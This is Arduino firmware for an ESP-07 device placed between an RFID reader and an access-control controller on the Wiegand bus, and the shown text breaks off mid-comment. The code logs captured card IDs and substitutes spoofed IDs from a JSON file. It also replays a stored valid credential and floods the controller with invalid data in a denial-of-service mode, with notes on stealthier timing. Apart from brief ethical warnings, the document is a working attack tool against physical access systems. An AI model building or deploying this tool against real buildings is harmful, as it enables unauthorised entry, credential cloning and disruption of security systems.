#include <Arduino.h>
#include <ArduinoJson.h>                // Allows parsing and generating JSON, useful for configuration or API responses

#include <DNSServer.h>                  // Provides DNS server capabilities, often used in captive portals
#include <ESP8266WiFi.h>                // Core library for handling WiFi on ESP-07 boards

#include <ESPAsyncTCP.h>                // Asynchronous TCP library, improves performance for TCP communication
#include <ESPAsyncWebServer.h>          // Asynchronous HTTP server for serving web pages or APIs without blocking the main loop

#include <LittleFS.h>                   // Filesystem library for reading/writing files on the ESP-07's internal flash storage
#include <FS.h>                         // General filesystem interface, used as a base for specific file systems like LittleFS

#include "secrets.h"                    // Header file containing sensitive data such as WiFi credentials (excluded from version control)



/*
 * *******************************************************
 * Intranet Mode for ESP-07
 * *******************************************************
 * Define USE_INTRANET to connect the ESP-07 to your home 
 * intranet for easier debugging during development.
 * 
 * When this mode is enabled, the ESP-07 will connect to 
 * your home Wi-Fi network (intranet). This allows you to 
 * access the ESP-07 web server from your browser without 
 * needing to reconnect to the network each time, which 
 * simplifies testing and debugging.
  * *******************************************************
 */
#define USE_INTRANET




/*
  *******************************************************
  IP Configuration for ESP-07
  *******************************************************
  This part of the code defines various IP settings for the ESP-07.
  - `Actual_IP`: Stores the IP address assigned to the ESP-07 when it connects to the home intranet (used in debug mode).
  - `PageIP`: The default IP address for the ESP-07 when it is acting as an Access Point (AP).
  - `gateway`: The gateway IP address for the ESP-07 when it's set up as an Access Point.
  - `subnet`: The subnet mask used for the ESP-07 when it's set up as an Access Point.
  *******************************************************
*/
IPAddress Actual_IP;
IPAddress PageIP(192, 168, 1, 1);    // Default IP address of the AP
IPAddress gateway(192, 168, 1, 1);   // Gateway for the AP
IPAddress subnet(255, 255, 255, 0);  // Subnet mask for the AP




/*
  *******************************************************
  Web Server and DNS Redirection Setup
  *******************************************************
  This part of the code sets up a web server on the ESP-07 and configures DNS redirection.
  - `server`: An instance of the ESP-07 WebServer that listens on port 80 (HTTP default port) to handle incoming HTTP requests.
  - `dnsServer`: An instance of the DNS server for handling custom DNS redirection. The ESP-07 can act as a DNS server, redirecting specific domain requests to its own IP address.
  - `homeIP`: The IP address that the ESP-07 will respond with when a certain domain (`evilcorp.io` in this case) is queried. 
  -  This address can be the IP address of the ESP-07 in AP mode or any custom address.
  - `domain`: The domain name that will be redirected to the ESP-07's IP address (e.g., `evilcorp.io`). 
  -  When a device queries this domain, the ESP-07 will intercept the request and respond with its own IP address.
  *******************************************************
*/

// Create an instance of the ESP-07 WebServer
AsyncWebServer server(80);  // HTTP server running on port 80

// DNS server instance
DNSServer dnsServer;

// IP address to return for a specific domain
IPAddress homeIP(192, 168, 1, 1);  // Redirected IP address for the domain

// The domain name to redirect to the ESP-07's IP address
const char *domain = "evilcorp.io";





/*
  ******************************************************************************
  HARDWARE CONFIGURATION AND PIN DEFINITIONS
  ******************************************************************************
  This section defines all hardware-related configurations and pin assignments:

  WIEGAND INPUT INTERFACE (FROM READER):
  - `PIN_DATA0_IN` (GPIO12/D6):  Wiegand DATA0 input (Green wire)
                                 - Low bit signal (active LOW)
                                 - Internal pull-up enabled (can be disabled if using external)
                                 - External pull-up option: 4.7kΩ-10kΩ to 3.3V
                                 - Signal normally HIGH, pulses LOW on bit reception
  
  - `PIN_DATA1_IN` (GPIO13/D7):  Wiegand DATA1 input (White wire)
                                 - High bit signal (active LOW)
                                 - Internal pull-up enabled (can be disabled if using external)
                                 - External pull-up option: 4.7kΩ-10kΩ to 3.3V
                                 - Signal normally HIGH, pulses LOW on bit reception

  WIEGAND OUTPUT INTERFACE (TO CONTROLLER):
  - `PIN_DATA0_OUT` (GPIO4/D2):  Wiegand DATA0 output (Green wire)
                                 - Low bit signal (active LOW)

  - `PIN_DATA1_OUT` (GPIO5/D1):  Wiegand DATA1 output (White wire)
                                 - High bit signal (active LOW)
  ******************************************************************************
*/
#define PIN_DATA0_IN  12   // GPIO12 (D6) - INT0 for Wiegand DATA0 input (Green wire)
#define PIN_DATA1_IN  13   // GPIO13 (D7) - INT1 for Wiegand DATA1 input (White wire)

#define PIN_DATA0_OUT 4   // GPIO4 (D2) - Wiegand DATA0 output
#define PIN_DATA1_OUT 5   // GPIO5 (D1) - Wiegand DATA1 output






/*
  ******************************************************************************
        ╔══════════════════╗                ╔══════════════════╗
        ║  RFID Reader     ║                ║  Access Control  ║
        ║ (Wiegand Reader) ║                ║                  ║
        ║                  ║                ║                  ║
        ║  VCC   o────────────┐           ┌───o VCC            ║
        ║  GND   o────────────┴───────────┴───o GND            ║
        ║  DATA0 o─────┐                  ┌───o DATA0          ║
        ║  DATA1 o─────┴────────┐     ┌───┴───o DATA1          ║
        ╚══════════════════╝    |     |     ╚══════════════════╝
                                |     |
                                |     | 
                             ╔════════════╗   
                             ║   ESP-07   ║
                             ║            ║
    Green  (DATA0_IN) ─────▶ ║ D6      D2 ║  ─────▶ Green (DATA0_OUT)
    White  (DATA1_IN) ─────▶ ║ D7      D1 ║  ─────▶ White (DATA1_OUT)
                             ║            ║
                             ║            ║
    Power     (3.3V)  ─────▶ ║ 3.3V   GND ║  ─────▶ GND
    Ground      (GND) ─────▶ ║ GND        ║
                             ╚════════════╝


    Left: RFID reader sending a Wiegand signal to the ESP-07
    Middle: ESP-07 reading, spoofing and/or sending a new ID
    Right: Access control to which ESP-07 can send "fake" tags

    All devices must have a common ground (GND).
    The Arduino sends output through pins D1 and D2, which go to the controller.
  ******************************************************************************
*/




/*
  ******************************************************************************
  WIEGAND PROTOCOL TIMING PARAMETERS
  ******************************************************************************
  This section defines critical timing parameters for Wiegand protocol handling:

  CARD FORMAT CONFIGURATION:
  - `MAX_CARD_BITS` (32):       Maximum bits to receive for standard HID cards
                                - 26-bit format also common (change if needed)
                                - Includes facility code + card number + parity

  PULSE CHARACTERISTICS:
  - `PULSE_WIDTH` (100):       Pulse duration in microseconds (µs)
                                - Typical range: 50-200µs (100µs recommended)
                                - Must be > controller's detection threshold
                                - Shorter pulses may not register reliably

  TIMING PARAMETERS:
  - `PULSE_INTERVAL` (2000):    Time between bits in microseconds (µs)
                                - Standard Wiegand specifies 0.5-20ms between bits
                                - 2ms (2000µs) is conservative reliable value
                                - Can be reduced to 1000µs for faster readers

  TIMEOUT SETTINGS:
  - `RECEIVE_TIMEOUT` (25):     Timeout after last pulse in milliseconds (ms)
                                - Resets card buffer if no new bits arrive
                                - Must be > inter-bit interval (recommend 2-3x)
                                - Too short may split cards, too long causes lag

  DEBUGGING TIPS:
  1. If missing bits: increase PULSE_WIDTH
  2. If split cards: increase RECEIVE_TIMEOUT
  3. If slow reading: decrease PULSE_INTERVAL (within spec)
  ******************************************************************************
*/
#define MAX_CARD_BITS 32          // Standard HID cards use 32-bit Wiegand format
#define PULSE_WIDTH 100           // Pulse duration in microseconds (100µs typical)
#define PULSE_INTERVAL 2000       // Time between bits in microseconds (2ms typical)
#define RECEIVE_TIMEOUT 25        // Timeout after last pulse in milliseconds










/*
  ******************************************************************************
  TIME MANAGEMENT SYSTEM
  ******************************************************************************
  This module provides epoch time tracking with millisecond precision using
  the Arduino millis() function as a timebase.

  GLOBAL VARIABLES:
  - `currentEpochTime`: Base Unix timestamp (seconds since 1970-01-01)
    - Initialized to 0 (1970 default)
    - Should be set via NTP/RTC in production

  - `baseTime`: Snapshot of epoch time at initialization
    - Used as reference point
    - Updated during time synchronization

  - `baseMillis`: millis() value at last synchronization
    - Provides drift compensation
    - Reset during time updates

  FUNCTIONS:
  1. initTime():
     - Stores current reference points
     - Call after any time synchronization
     - Resets drift compensation counters

  2. getCurrentEpoch():
     - Returns calculated Unix timestamp
     - Combines base time with millis() drift
     - Resolution: 1 second (truncated)
     - Wraps safely after ~50 days (millis() limit)

  ******************************************************************************
*/
unsigned long currentEpochTime = 0;  // Default: 1970-01-01

unsigned long baseTime = currentEpochTime;
unsigned long baseMillis = millis();

// Inicijalizacija vremena
void initTime() {
  baseTime = currentEpochTime;
  baseMillis = millis();
}


// Vrati tačno vreme
unsigned long getCurrentEpoch() {
    return baseTime + ((millis() - baseMillis) / 1000);
}








/*
  ******************************************************************************
  DENIAL-OF-SERVICE (DoS) ATTACK PARAMETERS
  ******************************************************************************
  This section configures advanced DoS attack characteristics:

  ATTACK PAYLOAD:
  - `DOS_ATTACK_VALUE` (0xFFFFFFFF):  Invalid card value transmitted during DoS
                                      - All bits set to 1 creates maximum noise
                                      - Guaranteed to fail parity checks
                                      - Alternative: Use 0x00000000 or random

  DURATION CONTROL:
  - `DOS_DURATION_MS` (5000):         DoS attack duration in milliseconds
                                      - 0 = infinite/persistent attack
                                      - 5000 = 5 second timed attack
                                      - Recommended max: 30000 (30s)

  SAFETY FEATURES:
  - Hardcoded maximum duration (suggest 30s)


  ******************************************************************************
  ETHICAL WARNING:
  DoS attacks can disrupt building operations and
  trigger security alerts. Always obtain proper
  authorization before testing on live systems.
  Maintain attack logs for compliance auditing.
  ******************************************************************************
*/
bool dosMode = false;                 // Set to true to enable DoS attack
unsigned long dosStartTime = 0;

// A value used in a DoS attack (eg noise, wrong ID)
uint32_t DOS_ATTACK_VALUE = 0xFFFFFFFF;

// If 0 → infinite; If, for example, 5000 → lasts 5 seconds
#define DOS_DURATION_MS 5000






/*
  ******************************************************************************
  REPLAY ATTACK CONFIGURATION
  ******************************************************************************
  This section defines parameters for card credential replay attacks:

  ATTACK CREDENTIAL:
  - `REPLAY_ATTACK_ID` (0x3573A6):   Pre-programmed valid card ID for replay attacks
                                     - Should match a known authorized credential
                                     - Format: [Facility Code:Card Number] encoded
                                     - Example: 0x3573A6 = Facility 0x35 + Card 0x73A6

  
    ATTACK CHARACTERISTICS:
  - Bypasses physical card requirement
  - Undetectable to basic monitoring systems
  

  
  WIEGAND CARD NUMBER FORMAT DECODING
  ******************************************************************************
  Standard Wiegand 26-bit format breakdown (using example 0x3573A6):

  BINARY STRUCTURE:
  [P][FFFF FFFF][CCCC CCCC CCCC CCCC][P]
  │   │         │                     │
  │   │         └─ Card Number (16 bits) 
  │   └─ Facility Code (8 bits)        
  └─ Parity bits (1 each side)

  EXAMPLE DECODING (0x3573A6):
  1. Full hexadecimal: 0x03573A6
  2. Binary representation:
     0000 0011 0101 0111 0011 1010 0110
  3. Parsed components:
     - Leading parity: 0
     - Facility Code:   0011 0101 → 0x35 (53 in decimal)
     - Card Number:     0111 0011 1010 0110 → 0x73A6 (29606 in decimal)
     - Trailing parity: 0

  FACILITY CODE:
  - 8-bit value (0-255) identifying organization/department
  - Assigned by card system administrator
  - Shared among all cards in same facility
  - Purpose: Logical grouping of credentials

  CARD NUMBER:
  - 16-bit value (0-65535) uniquely identifying individual
  - Assigned per cardholder
  - Normally sequential in commercial systems
  - Combined with Facility Code for global uniqueness

  COMMON VARIATIONS:
  1. 34-bit Wiegand:
     - Facility Code: 12 bits
     - Card Number: 20 bits
  2. Corporate 1000:
     - Facility Code: 16 bits
     - Card Number: 32 bits
  3. HID Corporate:
     - Additional site code field

  ******************************************************************************
  PRACTICAL IMPLICATIONS:
  - Replay attacks must preserve original Facility/Card structure
  - Access control decisions often use both values
  - Some systems check Facility Code validity first
  - Card Number alone is not globally unique
  ******************************************************************************
*/
bool replayAttack = false;            // Set to true to trigger replay attack

// Value used for Replay attack
uint32_t replayIdToSend = 0;
















/*
  ******************************************************************************
  WIEGAND PROTOCOL PROCESSING VARIABLES
  ******************************************************************************
  These volatile variables manage real-time Wiegand data reception and processing:

  DATA BUFFERS:
  - `tagData[MAX_CARD_BITS]` (volatile char): Circular buffer for raw bit storage
                                             - Each char represents one bit (0/1)
                                             - Size matches maximum expected format

  RECEPTION STATE:
  - `tagIndex` (volatile byte):             Current bit position in buffer
  - `receivingData` (volatile bool):        Data reception status flag
                                           - True: Active Wiegand transmission
                                           - False: Idle state between cards

  TIMING CONTROL:
  - `lastPulseTime` (volatile unsigned long): Timestamp of last received pulse


  PROCESSED OUTPUT:
  - `tagInt` (unsigned long):               Final converted card value
                                           - Contains full Facility/Card number
  ******************************************************************************
*/
volatile char tagData[MAX_CARD_BITS];
volatile byte tagIndex = 0;
volatile bool receivingData = false;
volatile unsigned long lastPulseTime = 0;
unsigned long tagInt = 0;





/*
  ******************************************************************************
  WIEGAND INTERRUPT SERVICE ROUTINES (ISRs)
  ******************************************************************************
  These functions handle low-level Wiegand pulse detection and bit processing:


  FUNCTION: readData0()
  PURPOSE:  Processes Wiegand DATA0 (low bit) pulses
  BEHAVIOR:
  1. Sets receivingData flag to mark active transmission
  2. Updates lastPulseTime with current millis() timestamp
  3. Safely stores '0' character in tagData buffer if space available
  4. Increments tagIndex for next bit position


  FUNCTION: readData1()
  PURPOSE:  Processes Wiegand DATA1 (high bit) pulses
  BEHAVIOR:
  1. Sets receivingData flag to mark active transmission
  2. Updates lastPulseTime with current millis() timestamp
  3. Safely stores '1' character in tagData buffer if space available
  4. Increments tagIndex for next bit position

  ******************************************************************************
*/
// Called when DATA0 line goes low (bit '0')
void ICACHE_RAM_ATTR readData0() {
  receivingData = true;
  lastPulseTime = millis();               // Update last received pulse time
  if (tagIndex < MAX_CARD_BITS) {
    tagData[tagIndex++] = '0';            // Store '0' bit
  }
}


// Called when DATA1 line goes low (bit '1')
void ICACHE_RAM_ATTR readData1() {
  receivingData = true;
  lastPulseTime = millis();                 // Update last received pulse time
  if (tagIndex < MAX_CARD_BITS) {
    tagData[tagIndex++] = '1';              // Store '1' bit
  }
}






/*
  ******************************************************************************
  CARD SPOOFING FUNCTIONALITY
  ******************************************************************************
  Dynamically substitutes a real RFID card ID with a spoofed target ID 
  based on mappings defined in spoof.json stored on LittleFS.

  PARAMETERS:
  - originalId: The original, legitimate RFID card ID detected by the system

  BEHAVIOR:
  - Loads spoof.json from LittleFS and parses it as an array of objects
  - Each object must contain both 'original' and 'target' fields
  - If originalId matches an 'original' entry (parsed as uint32_t), the
    corresponding 'target' is returned as the spoofed ID

  RETURN VALUE:
  - Returns the spoofed target ID if a match is found
  - Returns the originalId unchanged if no spoof entry matches or JSON fails

  ******************************************************************************
  WARNING:
  Unauthorized use may constitute computer fraud.
  Test spoof IDs:   0x3573A6, 0xFAC8ADAD, 0xBA2F1111, 0xA7B49090

  ******************************************************************************
*/
// Returns the spoofed ID if it is in the spoofed list
uint32_t getSpoofedId(uint32_t originalId) {
  File file = LittleFS.open("/spoof.json", "r");
  if (!file) {
    Serial.println("Failed to open spoof.json");
    return originalId;
  }

  DynamicJsonDocument doc(2048); // povećaj ako ti JSON bude veći
  DeserializationError error = deserializeJson(doc, file);
  file.close();

  if (error) {
    Serial.print("JSON parse error in spoof.json: ");
    Serial.println(error.c_str());
    return originalId;
  }

  if (!doc.is<JsonArray>()) {
    Serial.println("spoof.json does not contain a valid JSON array");
    return originalId;
  }

  JsonArray arr = doc.as<JsonArray>();
  for (JsonObject entry : arr) {
    if (!entry.containsKey("original") || !entry.containsKey("target"))
      continue;

    uint32_t orig = strtoul(entry["original"].as<const char*>(), NULL, 0);
    if (orig == originalId) {
      uint32_t target = strtoul(entry["target"].as<const char*>(), NULL, 0);
      Serial.printf("Spoofing ID: 0x%08X => 0x%08X\n", originalId, target);
      return target;
    }
  }

  return originalId;  // no match found
}






/*
  ******************************************************************************
  REPLAY ATTACK HANDLER IMPLEMENTATION
  ******************************************************************************
  Executes a one-time replay attack using preconfigured credentials

  OPERATION FLOW:
  1. Checks replayAttack flag (fails silently if false)
  2. Prints attack notification to Serial monitor
  3. Transmits REPLAY_ATTACK_ID via Wiegand interface
  4. Outputs both decimal and hexadecimal ID formats
  5. Auto-resets attack flag (single-shot behavior)
  ******************************************************************************
*/
// Simulates re-transmitting a known valid card ID
void triggerReplayAttack() {
  if (!replayAttack) return;

  Serial.println("\nPerforming Replay Attack!");
  emulateWiegand(replayIdToSend);
  Serial.printf("Sending: %u (HEX: 0x%08X)\n", replayIdToSend, replayIdToSend);
  replayAttack = false;
}








/*
  ******************************************************************************
  DENIAL-OF-SERVICE (DoS) ATTACK IMPLEMENTATION  
  ******************************************************************************
  Floods Wiegand interface with invalid data when activated

  ATTACK CHARACTERISTICS:
  - Transmits DOS_ATTACK_VALUE (0xFFFFFFFF) continuously
  - Optional 500ms delay controls attack intensity
  - Persists while dosMode flag remains true

  TECHNICAL IMPACT:
  1. On Readers:
     - Overwrites legitimate card transmissions
     - May cause reader buffer overflows
     - Can trigger watchdog resets

  2. On Controllers:
     - Forces continuous parity checking
     - May fill system logs with errors
     - Could activate security lockouts

  CONFIGURATION:
  - Attack Value: 0xFFFFFFFF (all bits high)
     - Alternative patterns: 
       * 0x00000000 (all low) 
       * 0xAAAAAAAA (alternating bits)
       * Randomly generated values
  - Delay: 500ms (adjustable)
     - Shorter = more aggressive (50-100ms)
     - Longer = stealthier (1000-2000ms)

  ******************************************************************************
  SECURITY WARNINGS:
  !! HIGH RISK OPERATION !!
  - May cause permanent system damage
  - Likely triggers security alerts
  - Always use isolated test systems

  ******************************************************************************
*/
// Continuously spams the line with invalid data if dosMode is enabled
void triggerDosAttack() {
  if (!dosMode) return;                         // Do nothing if not in DoS mode

  Serial.println("Performing DoS Attack!");
  emulateWiegand(DOS_ATTACK_VALUE);             // Send invalid/spam data (e.g., 0xFFFFFFFF or random noise)

  // Add delay to avoid overwhelming system
  delay(500);                                   // Optional: tweak or remove based on behavior
}







/*
  ******************************************************************************
  WIEGAND PROTOCOL EMULATION ENGINE
  ******************************************************************************
  Transmits 32-bit data using Wiegand protocol timing specifications

  PROTOCOL IMPLEMENTATION:
  - Transmits bits MSB-first (standard Wiegand convention)
  - Maintains strict pulse timing parameters:
    * PULSE_WIDTH (µs): Active low pulse duration
    * PULSE_INTERVAL (µs): Time between bits
  - Uses two-wire (DATA0/DATA1) differential signaling

  TECHNICAL DETAILS:
  1. Bit Transmission Logic:
     - '0': Pulse on DATA0 line (GPIO4)
     - '1': Pulse on DATA1 line (GPIO5)
     - Each pulse is active-LOW with precise timing

  2. Timing Diagram:
     BitN: |¯¯|___|¯¯¯¯¯¯|   (PULSE_WIDTH low, PULSE_INTERVAL total)
           |<----->|       (PULSE_WIDTH)
           |<--------->|   (PULSE_INTERVAL)

  ******************************************************************************
  PARAMETERS:
  - data: 32-bit value to transmit (includes facility/card/parity)
          Format must match target system expectations

  CRITICAL TIMING:
  - Total transmission time = 
    MAX_CARD_BITS * (PULSE_WIDTH + PULSE_INTERVAL)
  - Example (26-bit @ 100µs/2000µs): ~54.6ms

  ******************************************************************************
*/
void emulateWiegand(uint32_t data) {

  // Send each bit starting with the MSB (most significant bit)
  for (int i = MAX_CARD_BITS - 1; i >= 0; i--) {
    bool bit = (data >> i) & 1;
    if (bit) {
      // Send '1' by pulsing DATA1 line
      digitalWrite(PIN_DATA1_OUT, LOW);
      delayMicroseconds(PULSE_WIDTH);
      digitalWrite(PIN_DATA1_OUT, HIGH);
    } else {
      // Send '0' by pulsing DATA0 line
      digitalWrite(PIN_DATA0_OUT, LOW);
      delayMicroseconds(PULSE_WIDTH);
      digitalWrite(PIN_DATA0_OUT, HIGH);
    }
    // Maintain timing between bits
    delayMicroseconds(PULSE_INTERVAL);
  }
}









/*
  ******************************************************************************
  RFID ACCESS LOGGING SYSTEM
  ******************************************************************************
  Records RFID access events to JSON log file with timestamp and metadata

  OPERATION FLOW:
  1. File Handling:
     - Opens "/rfidusers.json" in read-update mode

  2. JSON Processing:
     - Uses 2KB DynamicJsonDocument buffer
     - Handles deserialization errors
     - Maintains backward compatibility

  3. Data Analysis:
     - Tracks highest entry number
     - Checks for existing RFID entries
     - Preserves existing names

  4. New Entry Creation:
     - Auto-increments entry number
     - Formats RFID as "0xHEX"
     - Attaches epoch timestamp
     - Retains null name for new entries

  5. File Writing:
     - Pretty-printed JSON output
     - Atomic write operation
     - Error handling

  ******************************************************************************
  DATA STRUCTURE:
  [
    {
      "entry_number": 1,
      "rfid_hex": "0x123ABC",
      "name": "Optional Name",
      "epoch_time": 1672531200
    },
    ...
  ]

  ******************************************************************************
*/

void logRFIDEntry(uint32_t rfidHex) {
  // Open the RFID users file
  File file = LittleFS.open("/rfidusers.json", "r+");
  if (!file) {
    Serial.println("Failed to open rfidusers.json");
    return;
  }

  // Parse existing data
  DynamicJsonDocument doc(2048);
  DeserializationError error = deserializeJson(doc, file);
  if (error) {
    Serial.print("JSON parse error: ");
    Serial.println(error.c_str());
    file.close();
    return;
  }

  // Close file before reopening for writing
  file.close();

  // Find highest entry number and check if RFID exists
  int maxEntryNumber = 0;
  String existingName;
  bool rfidExists = false;
  
  for (JsonObject entry : doc.as<JsonArray>()) {
    int entryNum = entry["entry_number"];
    if (entryNum > maxEntryNumber) {
      maxEntryNumber = entryNum;
    }
    
    if (entry["rfid_hex"].as<String>() == String("0x") + String(rfidHex, HEX)) {
      rfidExists = true;
      existingName = entry["name"].as<String>();
    }
  }

  // Create new entry
  JsonObject newEntry = doc.createNestedObject();
  newEntry["entry_number"] = maxEntryNumber + 1;
  newEntry["rfid_hex"] = String("0x") + String(rfidHex, HEX);
  newEntry["name"] = rfidExists ? existingName : static_cast<const char*>(nullptr);
  newEntry["epoch_time"] = getCurrentEpoch();

  // Write back to file
  file = LittleFS.open("/rfidusers.json", "w");
  if (!file) {
    Serial.println("Failed to open file for writing");
    return;
  }

  serializeJsonPretty(doc, file);
  file.close();

  Serial.println("RFID entry logged successfully");
}







/*
  ******************************************************************************
  TAG PROCESSING AND CREDENTIAL HANDLING
  ******************************************************************************
  Converts raw Wiegand bits to usable credential and manages MITM operations

  PROCESSING STEPS:
  - Binary Conversion:
     - Converts stored bits ('0'/'1' chars) to uint32_t numeric value
     - MSB-first bit ordering (standard Wiegand)
     - Handles variable bit lengths (26-32 bits typically)

  - Validation:
     - Rejects null/zero values
     - Minimum length check (26-bit for standard HID)
     - Silent rejection of invalid tags

  - Debug Output:
     - Raw binary string
     - Decimal value
     - Hexadecimal representation

  SECURITY CHECKS:
  - Minimum 26-bit length prevents bit errors
  - Zero-value check avoids null transmissions

  ******************************************************************************
  DATA FLOW EXAMPLE:
  Reader:     [1010 1100 1111 0000 1101 0101] (26-bit)
  ESP07:      → Converts to 0xACF0D5 (DEC: 11325401)
  Spoofing:   If 0xACF0D5 in spoofedOriginals → replace with spoofTargetId
  Controller: Receives either original or spoofed credential

  ******************************************************************************
*/
void processTag() {
  // Convert the received binary string to a number
  uint32_t numericValue = 0;
  for (int i = 0; i < tagIndex; i++) {
    numericValue = (numericValue << 1) | (tagData[i] == '1' ? 1 : 0);
  }
  tagInt = numericValue;

  // IGNORE empty, short or null IDs
  if (tagInt == 0 || tagIndex < 26) {
    Serial.println("⚠️ Invalid or empty tag. Ignoring...");
    return;
  }

  // Prints received binary string
  Serial.print("\nReceived: ");
  for (int i = 0; i < tagIndex; i++) Serial.print(tagData[i]);

  // Print decimal and hex
  Serial.print(" (DEC: ");
  Serial.print(tagInt);
  Serial.print(" | HEX: 0x");
  Serial.print(tagInt, HEX);
  Serial.println(")");

  // Log the RFID entry
  logRFIDEntry(tagInt);

  // Spoofing ID if necessary
  uint32_t outputId = getSpoofedId(tagInt);

  // Print spoof ID (if applied)
  Serial.print("Sending: ");
  Serial.print(outputId);
  Serial.print(" (HEX: 0x");
  Serial.print(outputId, HEX);
  Serial.println(")");

  // Output emulation
  emulateWiegand(outputId);
}




/*
  ******************************************************************************
  COMMAND HISTORY BUFFER IMPLEMENTATION
  ******************************************************************************
  This module provides command recall functionality for serial interface debugging
  and operation monitoring.

  DESIGN SPECIFICATIONS:
  - Circular buffer architecture (FIFO)
  - Fixed capacity (10 most recent commands)
  - Case-preserving storage (original input)
  - Zero-allocation operation (static memory)


  ******************************************************************************
*/
#define MAX_HISTORY 10
String commandHistory[MAX_HISTORY];
uint8_t historyIndex = 0;






/*
  ******************************************************************************
  INTERACTIVE HELP SYSTEM WITH HUMOR
  ******************************************************************************
  Provides complete command reference with both functional and humorous elements
  
  OUTPUT STRUCTURE:
  1. Functional Commands (Actual ESP32 functionality):
     - ESP Information (espinfo, flashinfo)
     - System Control (reset, restart)
     - Help System (history, help, cls)
     - Time Management (time)

  2. Joke Linux Commands (Easter eggs that print funny responses):
     - File System (ls, rm, mv, chmod, grep, find, diff, dd)
     - Process (kill, sudo, whoami)
     - Networking (ping, ssh, ifconfig, tail)
     - Editors (vim, nano)
     - Monitoring (cron, bash)

  


  HUMOR IMPLEMENTATION:
  - Linux parody commands trigger funny responses
  - All joke commands clearly identifiable as:
     * Non-functional
     * Meant for entertainment

  ******************************************************************************
  EXAMPLE OUTPUT:
    [Actual Commands]
        espinfo       - ESP chip information
        reset         - Reset ESP module


    [Joke Commands]
        ls           - "bash: ls: command not found" (Linux parody)
        sudo         - "How about you sudo relax instead?" 
  ******************************************************************************
*/
String showHelp() {
  String help = "";
  help += "\n";
  help += "ESP COMMANDS:\n";
  help += "  espinfo               - ESP chip information\n";
  help += "  flashinfo             - Flash memory information\n";
  help += "  systemstatus          - Get system status\n";
  help += "  listfiles             - List system files\n\n";
  help += "  time                  - Show current date and time\n";

  help += "  reset                 - Reset the ESP module\n";
  help += "  restart               - Restart the ESP module\n\n";

  help += "HELP COMMANDS:\n";
  help += "  history               - Show command history\n";
  help += "  h/help/?              - Show this help message\n";
  help += "  cls                   - Clear screen\n\n";

  help += "FILE SYSTEM COMMANDS:\n";
  help += "  ls      - List directory contents\n";
  help += "  rm      - Remove files or directories\n";
  help += "  mv      - Move (rename) files\n";
  help += "  chmod   - Change file modes/attributes\n";
  help += "  grep    - Search for patterns in files\n";
  help += "  find    - Search for files\n";
  help += "  diff    - Compare files line by line\n";
  help += "  dd      - Convert and copy files\n\n";
  
  help += "PROCESS COMMANDS:\n";
  help += "  kill     - Send signals to processes\n";
  help += "  sudo     - Execute command as superuser\n";
  help += "  whoami   - Print effective userid\n\n";
  
  help += "NETWORKING COMMANDS:\n";
  help += "  ping     - Send ICMP ECHO_REQUEST packets\n";
  help += "  ssh      - OpenSSH SSH client\n";
  help += "  ifconfig - Configure network interfaces\n";
  help += "  tail     - Output last part of files\n\n";
  
  help += "EDITING COMMANDS:\n";
  help += "  vim      - Vi IMproved text editor\n";
  help += "  nano     - Simple text editor\n\n";
  
  help += "SYSTEM MONITORING:\n";
  help += "  cron     - Daemon to execute scheduled commands\n";
  help += "  bash     - GNU Bourne-Again SHell\n\n";
  
  help += "\n";
  help += "-----------------------------------------------------------\n\n";
  return help;
}





/*
  ******************************************************************************
  ACCESS POINT (AP) MODE INITIALIZATION
  ******************************************************************************
  Configures the ESP-07 to operate as a wireless Access Point with the following
  parameters and functionality:

  CORE FEATURES:
  - Creates a WiFi network with configurable SSID and password
  - Sets up AP network parameters (IP range, subnet mask)
  - Enables broadcast of the specified SSID
  - Implements basic security through WPA2 password protection

  NETWORK PARAMETERS:
  - Default IP: 192.168.1.1 (configurable)
  - Default Subnet: 255.255.255.0
  - Default AP Channel: 1 (configurable)
  - Maximum Connections: Typically 4-8 clients (hardware dependent)

  OPERATIONAL NOTES:
  1. SSID visibility can be controlled (visible/hidden)
  2. Password must meet minimum length requirements (8+ chars recommended)
  3. IP address and network parameters should be logged after initialization
  4. AP mode consumes more power than station mode

  TYPICAL USAGE:
  1. Call during setup() to establish AP
  2. Monitor connection status via WiFi.softAPgetStationNum()
  3. Combine with DNS server for captive portal functionality
  ******************************************************************************
*/
void startAP() {

  // Start the Access Point with the defined SSID and password
  WiFi.softAP(AP_SSID, AP_PASS);

  delay(100);     // Brief delay to ensure the AP starts properly

  // Configure the Access Point's network settings: IP, gateway, and subnet
  WiFi.softAPConfig(PageIP, gateway, subnet);

  delay(100);     // Brief delay to ensure network settings are applied

  // Notify that the Access Point is active
  Serial.println("\nAccess Point Started");

  // Retrieve and display the IP address assigned to the Access Point
  Actual_IP = WiFi.softAPIP();

  Serial.print("IP address: ");
  Serial.println(Actual_IP);
}





/*
  ******************************************************************************
  LITTLEFS FILE SYSTEM DIRECTORY LISTING
  ******************************************************************************
  Scans and displays the contents of the LittleFS filesystem with detailed file
  information, primarily used for debugging and system verification.

  CORE FUNCTIONALITY:
  - Recursively lists all files in specified directory path
  - Displays complete file paths relative to LittleFS root
  - Shows precise file sizes in bytes
  - Handles both files and directories

  OUTPUT FORMAT:
  - [File] /path/filename.ext (size bytes)
  - [Dir]  /path/subdirectory/

  TECHNICAL DETAILS:
  - Uses LittleFS directory traversal functions
  - Implements recursive scanning for complete filesystem overview
  - Calculates exact file sizes including filesystem overhead

  EXAMPLE OUTPUT:
  [File] /config/settings.json (512 bytes)
  [Dir]  /data/logs/
  [File] /data/logs/system.log (2048 bytes)
  ******************************************************************************
*/
String listFiles(const char *dir) {
  String output = "";
  output += "\n";
  output += "LIST FILES\n";
  
  // Open the directory
  File root = LittleFS.open(dir, "r");
  if (!root) {
    return "  * Failed to open directory";
  }

  // Find the first file in the directory
  File file = root.openNextFile();
  while (file) {
    String fileName = file.name();
    size_t fileSize = file.size();

    output += "  * File: " + fileName + " | Size: " + String(fileSize) + "\n";

    // Go to the next file
    file = root.openNextFile();
  }

  if (output == "") {
    return "  * No files found";
  }
  
  output += "\n\n";
  return output;
}





/*
 * ===========================================================================
 *                          ESP-07 COMMAND SECTION
 * ===========================================================================
 * 
 * Description:
 *   This section contains all commands and functions specific to the ESP-07 module,
 *   including system information, memory status, and module control.
 * 
 * Key Features:
 *   - Hardware information retrieval
 *   - Flash memory diagnostics
 *   - System control commands
 *   - Dual output (Serial + Web interface)
 * 
 * Command Summary:
 *   espinfo    - Displays detailed ESP chip information
 *   flashinfo  - Shows flash memory configuration
 *   reset      - Performs hardware reset
 *   restart    - Software restart of the module
 * 
 * Information Provided:
 *   - Chip identification and version
 *   - CPU frequency and performance
 *   - Flash memory size/speed/mode
 *   - Memory allocation details
 *   - Sketch storage information
 * 
 * Usage Examples:
 *   [Serial Terminal]
